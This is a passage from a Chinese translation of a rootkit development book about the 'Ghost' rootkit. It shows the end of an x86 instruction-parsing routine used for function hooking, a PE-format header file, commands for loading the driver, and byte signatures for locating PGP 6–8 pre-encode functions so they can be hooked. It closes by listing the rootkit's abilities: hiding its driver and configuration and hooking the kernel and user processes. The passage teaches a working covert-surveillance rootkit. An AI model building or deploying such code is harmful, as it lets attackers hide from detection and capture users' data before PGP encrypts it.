
```
memset( instructionBuffer, 0, sizeof(instructionBuffer) );

nextInstructionLength = getNextInstruction( thisInstruction, 1, instructionBuffer, MAX_INSTRUCTION );

if( nextInstructionLength <= 0 )
   break;

thisInstructionLength -= nextInstructionLength;
thisInstruction += nextInstructionLength;
}

return FALSE;
}

#pragma optimize( "", on )
```

`x86` 指令语法分析如图 4-3 所示。

一般而言，`transferInstruction` 使用目标函数的第一字节来确定该位置 `x86` 指令的类型和格式大小。第一字节被当作目录映射到 `instructionMap` 中，将第一个字节映射到全 `x86` 指令。一旦确定了指令的格式大小并确定不是一个跳转，那么这个指令将可以被翻译为一个跳转并被一个跳转指令改写，这个跳转指令将操作转移到一个嵌入函数，然后按顺序调用原函数和其他在原函数前或后面的你想注入的函数一样。

### `peFormat.h`

`peFormat.h` 文件包含的数据结构是分析 PE 格式文件所必须的。这些数据结构在微软所提供的头文件中不容易找到。`Ghost` 所需要的数据结构已经在 `winnt.h` 文件中提取出来了，因此这个头文件不容易被包含在一个 DDK 来构建。对于开发者使用 XP DDK，可以使用 `ntimage.h` 文件，但是为了使过程尽量简单，并尽可能使用其他开发环境，就需要使用 `peFormat.h` 文件：

```
// Copyright Ric Vieler, 2006
// Support header for hookManager.c
// Contains required PE file format data structures used by GetIndex()

#ifndef _PE_FORMAT_HEADER_
#define _PE_FORMAT_HEADER_

//
// Image Format
//

#pragma pack(2) // 16 bit headers are 2 byte packed
#define IMAGE_DOS_SIGNATURE 0x5A4D // MZ

typedef struct _IMAGE_DOS_HEADER {       // DOS .EXE header
    WORD   e_magic;  // Magic number
    WORD   e_cblp; // Bytes on last page of file
    WORD   e_cp;  // Pages in file
    WORD   e_crlc;  // Relocations
    WORD   e_cparhdr;  // Size of header in paragraphs
    WORD   e_minalloc; // Minimum extra paragraphs needed
    WORD   e_maxalloc; // Maximum extra paragraphs needed
    WORD   e_ss; // Initial (relative) SS value
    WORD   e_sp; // Initial SP value
    WORD   e_csum; // Checksum
    WORD   e_ip;  // Initial IP value
    WORD   e_cs; // Initial (relative) CS value
    WORD   e_lfarlc; // File address of relocation table
    WORD   e_ovno; // Overlay number
    WORD   e_res[4];  // Reserved words
    WORD   e_oemid; // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo; // OEM information; e_oemid specific
    WORD   e_res2[10]; // Reserved words
    LONG   e_lfanew; // File address of new exe header
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

#pragma pack(4) // Back to 4 byte packing

//
// File header format.
//

typedef struct _IMAGE_FILE_HEADER {
    WORD    Machine;
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

//
// Directory format.
//

typedef struct _IMAGE_DATA_DIRECTORY {
 DWORD   VirtualAddress;
 DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16

//
// Optional header format.
//

typedef struct _IMAGE_OPTIONAL_HEADER {
 //
 // Standard fields.
 //
 WORD    Magic;
 BYTE    MajorLinkerVersion;
 BYTE    MinorLinkerVersion;
 DWORD   SizeOfCode;
 DWORD   SizeOfInitializedData;
 DWORD   SizeOfUninitializedData;
 DWORD   AddressOfEntryPoint;
 DWORD   BaseOfCode;
 DWORD   BaseOfData;
 //
 // NT additional fields.
 //
 DWORD   ImageBase;
 DWORD   SectionAlignment;
 DWORD   FileAlignment;
 WORD    MajorOperatingSystemVersion;
 WORD    MinorOperatingSystemVersion;
 WORD    MajorImageVersion;
 WORD    MinorImageVersion;
 WORD    MajorSubsystemVersion;
 WORD    MinorSubsystemVersion;
 DWORD   Win32VersionValue;
 DWORD   SizeOfImage;
 DWORD   SizeOfHeaders;
 DWORD   CheckSum;
 WORD    Subsystem;
 WORD    DllCharacteristics;
 DWORD   SizeOfStackReserve;
 DWORD   SizeOfStackCommit;
 DWORD   SizeOfHeapReserve;
 DWORD   SizeOfHeapCommit;
 DWORD   LoaderFlags;
 DWORD   NumberOfRvaAndSizes;
 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;

//
// Export Format
//

typedef struct _IMAGE_EXPORT_DIRECTORY {
 DWORD   Characteristics;
 DWORD   TimeDateStamp;
 WORD    MajorVersion;
 WORD    MinorVersion;
 DWORD   Name;
 DWORD   Base;
 DWORD   NumberOfFunctions;
 DWORD   NumberOfNames;
 DWORD   AddressOfFunctions;     // RVA from base of image
 DWORD   AddressOfNames;         // RVA from base of image
 DWORD   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

// Directory Entries
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory

#endif
```

一旦编译并加载后，点击 Checked DDK 图标并使用第一二章编写的 `SCMLoader.exe`，你就可以打开服务了，使用“`net start MyDeviceDriver`”来过滤运往 `PGP` 加密的数据。

### 使用 `Ghost` 来分块 `PGP` 编码

为了演示这个例子中定义的用户钩子，你需要下载 `PGP Desktop9` 版本。截止本书编写为止，PGP 桌面专业版 9 可以在 `www.pgp.com/downloads/index.html` 下载到。 下载的这个版本允许免费试用 30 天，这些时间对于演示本章用户层钩子以及以下章节是足够的了。另一方面，如果你经常使用免费版本的 `PGP`（如版本 6 到 8），你可以使用下面样式中的一个：

`PGP version 6 pre-encode pattern (for PGP_SDK.dll)`:

```
0x81, 0xEC, 0xC8, 0x00, 0x00, 0x00, 0x53, 0x55, 0x8B, 0xAC, 0x24, 0xD8, 0x00, 0x00,
0x00, 0x57, 0xB9, 0x25, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x8D, 0x7C, 0x24, 0x14, 0x6A
```

`PGP version 7 pre-encode pattern (for PGPsdk.dll)`:

```
0x81, 0xEC, 0xC0, 0x00, 0x00, 0x00, 0x53, 0x55, 0x8B, 0xAC, 0x24, 0xD0, 0x00, 0x00,
0x00, 0x57, 0xB9, 0x23, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x8D, 0x7C, 0x24, 0x18, 0x6A
```

`PGP version 8 pre-encode pattern (for PGPsdk.dll)`:

```
0x81, 0xEC, 0xC4, 0x00, 0x00, 0x00, 0x53, 0x55, 0x8B, 0xAC, 0x24, 0xD4, 0x00, 0x00,
0x00, 0x57, 0xB9, 0x23, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x8D, 0x7C, 0x24, 0x18, 0x6A
```

### 总结

这章完整的讲述了进程注入应用程序内存所需的重要部分。为了使代码尽可能简单，只保持最小功能函数被执行。一个完整的 `PGP` 监视器需要包括各个 `PGP SDK DLL` 可能版本的样式同时需要为各个版本 `PGP SC DLL` 中的 Self Decrypting Archive （自解密库）附加一个钩子，还需要为使用 `PGP9` 的多文件加密创建另一个钩子。幸运的是，使用提供的工具，并对 `IDA` 有比较深刻的了解，这个附加函数功能可以很快的被添加完成。图 4-4 所示一个完整的 `PGP` 监视器。

图 4-4

我们现在已经有了一个具有如下功能的 rootkit：

- 隐藏设备驱动程序条目
- 隐藏它的配置文件
- 挂钩操作系统内核
- 挂钩所选的被操作系统加载的进程

我们离一个功能完整的 rootkit 已经很近了。当然，我们仍不能说可以通过本地应用程序或远程应用程序来控制 rootkit。在我们进入通讯编程前，我们还需要懂得基本的 I/O 系统。下章介绍 rootkit 至关重要的部分：I/O 处理。
